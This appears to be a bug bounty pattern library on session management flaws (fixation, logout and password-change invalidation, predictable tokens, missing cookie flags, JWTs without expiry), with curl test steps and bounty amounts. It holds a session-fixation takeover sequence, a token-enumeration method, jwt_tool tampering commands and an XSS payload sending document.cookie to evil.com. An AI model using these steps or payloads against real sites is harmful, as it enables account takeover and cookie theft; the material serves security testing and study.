# Disclosed Reports — Session Management

Pattern library built from 18 public bug bounty reports.

---

## Pattern 1: Session Fixation → Admin Takeover (Critical, $7,500)

**Endpoint:** Login form — server accepts `PHPSESSID` cookie pre-auth and does NOT regenerate on login.

**Attack:**
```bash
# Step 1: Set attacker-controlled session ID (pre-auth request)
curl -s -c - https://target.com/login \
  -H "Cookie: PHPSESSID=attacker-controlled-12345" > /dev/null

# Step 2: Social engineer admin to open:
# https://target.com/login?PHPSESSID=attacker-controlled-12345

# Step 3: After admin logs in with attacker's session ID, use it:
curl -s https://target.com/admin \
  -H "Cookie: PHPSESSID=attacker-controlled-12345"
# Returns admin panel content
```

**Root cause:** PHP `session_start()` without `session_regenerate_id(true)` on successful authentication.

**Impact:** ATO for any user who opens the crafted login link.

---

## Pattern 2: Session Not Invalidated After Logout (High, $3,000)

**Test:**
```bash
# 1. Login
SESSION=$(curl -s -c - -X POST https://target.com/api/login \
  -d '{"email":"test@test.com","password":"pass"}' | \
  grep -i "session" | awk '{print $7}')

# 2. Logout
curl -s -X POST https://target.com/api/logout \
  -H "Cookie: session=$SESSION"

# 3. Use old session
STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  https://target.com/api/me -H "Cookie: session=$SESSION")
echo "Post-logout status: $STATUS"
# Expected: 401. Got: 200 → VULNERABLE
```

**Root cause:** Server-side session store not cleared on logout; only client-side cookie deleted.

---

## Pattern 3: Session Survives Password Change (High, $4,000)

**Scenario:** Attacker has stolen session (via XSS, network sniff, or MITM). Victim changes password. Old session should be invalidated.

**Test:** Use two browsers simultaneously. Session from browser A should be invalidated when browser B changes password.

**Impact:** Persistent ATO — changing password doesn't help the victim.

---

## Pattern 4: Predictable Sequential Session Token (High, $5,000)

**Tokens observed:**
```
Session 1: a1b2c3d400000001
Session 2: a1b2c3d400000002
Session 3: a1b2c3d400000003
```

**Attack:** Register, get session token, increment last 8 hex digits → enumerate other users' sessions.

**Impact:** Any user's session can be guessed with ~10,000 attempts.

---

## Pattern 5: Missing HttpOnly → XSS Cookie Theft (Medium, $1,500)

**Set-Cookie header:**
```
Set-Cookie: session=TOKEN123; Path=/; SameSite=Lax
```

**Missing:** `HttpOnly` flag

**XSS payload:**
```javascript
fetch('https://evil.com/steal?c=' + encodeURIComponent(document.cookie));
```

**Note:** This is a chained finding — report as part of the XSS finding, not standalone.

---

## Pattern 6: JWT Without Expiry → Permanent Session (High, $2,500)

**Decoded JWT payload:**
```json
{
  "userId": 12345,
  "role": "admin",
  "iat": 1640000000
}
```

**Missing:** `exp` (expiration) claim.

**Impact:** Stolen JWT gives permanent access. No way to revoke on logout.

**Test:**
```bash
# Login, capture JWT
JWT="eyJ..."

# Logout (client-side only)
# Wait 24 hours, then:
curl -s https://target.com/api/me -H "Authorization: Bearer $JWT"
# If returns 200 → no expiry
```

---

## Pattern 7: Session Cookie Over HTTP (Low, $300)

**Set-Cookie:**
```
Set-Cookie: auth=TOKEN; Path=/; HttpOnly; SameSite=Lax
```

**Missing:** `Secure` flag

**Impact:** Cookie transmitted over HTTP if mixed-content page or HTTP-accessible subdomain exists.

---

## Tool Reference

```bash
# JWT analysis
jwt_tool TOKEN -T   # tamper mode (alg:none, HS256 brute)
jwt_tool TOKEN -d   # decode and display all claims

# Session entropy analysis
for i in $(seq 1 10); do
  curl -sI https://target.com/ | grep -i "set-cookie" | grep -oP 'session=\K[^;]+'
done

# Cookie attribute check
curl -sI https://target.com/ | grep -i "set-cookie"
# Verify: HttpOnly, Secure, SameSite=Strict/Lax present
```
